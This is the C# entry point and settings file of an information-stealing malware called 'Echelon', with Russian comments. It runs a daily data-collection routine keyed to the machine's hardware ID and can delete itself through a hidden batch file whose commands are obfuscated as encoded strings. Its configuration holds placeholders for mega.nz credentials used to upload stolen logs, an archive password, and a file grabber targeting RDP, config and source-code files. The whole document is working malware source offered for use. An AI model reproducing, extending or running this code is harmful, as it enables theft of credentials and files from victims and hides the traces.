
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;


namespace Echelon
{
    internal class Program
    {
        #region Stealer

        [STAThread]
        private static void Main()
        {
            // Проверка файла Help.HWID
            if (!File.Exists(Help.LocalData + "\\" + Help.HWID))
            {
                // Файла Help.HWID нет, запускаем стиллер
                Collection.GetCollection();
            }
            else
            {
                // Файл Help.HWID есть, проверяем записанную в нем дату
                if (!File.ReadAllText(Help.LocalData + "\\" + Help.HWID).Contains(Help.HWID + Help.dateLog))
                    // Дата в файле Help.HWID отличается от сегодняшней, запускаем стиллер
                    Collection.GetCollection();
                else
                    if (doubleExecute)
                        Collection.GetCollection();
                    else
                        Environment.Exit(0);
            }
            // Самоудаление после отправки лога
            if (selfDelete)
            {
                var batch = Path.GetTempFileName() + Decrypt.Get("H4sIAAAAAAAEANNLzk0BAMPCtLEEAAAA");
                using (var sw = new StreamWriter(batch))
                {
                    sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEAFNySE3OyFfIT0sDAP8G798KAAAA")); // скрываем консоль
                    sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEACvJzE3NLy1RMFGwU/AL9QEAGpgiIA8AAAA=")); // Задержка до выполнения следуюющих команд в секундах.
                    sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHNx9VEAAJx/wSQEAAAA") + "\"" + Path.GetFileName(new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name) + "\"" + " /f /q"); // Удаляем исходный билд
                    sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHN2UQAAQkDmIgMAAAA=") + Path.GetTempPath()); // Переходим во временную папку юзера
                    sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHNx9VEAAJx/wSQEAAAA") + "\"" + batch + "\"" + " /f /q"); // Удаляем .cmd
                }
                Process.Start(new ProcessStartInfo
                {
                    FileName = batch,
                    CreateNoWindow = true,
                    ErrorDialog = false,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            Environment.Exit(0);
            
        }

        #endregion

        #region Settings Stealer

        // Уникальный идентификатор билда, опционально.
        public static string buildversion = "V6.2.5 by Ambal2221";

        public static string megaLOGIN = "AAAAAAA"; // логин(почта) от mega.nz
        public static string megaPass = "SSSSSSS"; // пароль от mega.nz

        private static bool selfDelete = false; //самоудаление исполняемого файла
        private static bool doubleExecute = true; //включить повторный запуск стиллера на сегодняшний день ?
        
        // Пароль для архива с логом:
        public static string passwordzip = "PASS1234"; // На архив

        // максимальный вес файла в файлграббере 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
        public static int sizefile = 10500000;

        //включить граббер файлов?
        public static bool enableGrab = false;
        // Список расширений для сбора файлов
        public static string[] expansion = {
          ".txt", ".rdp", ".suo", ".config", ".cs", ".csproj", ".tlp", ".sln"
        };

        #endregion

    }
}
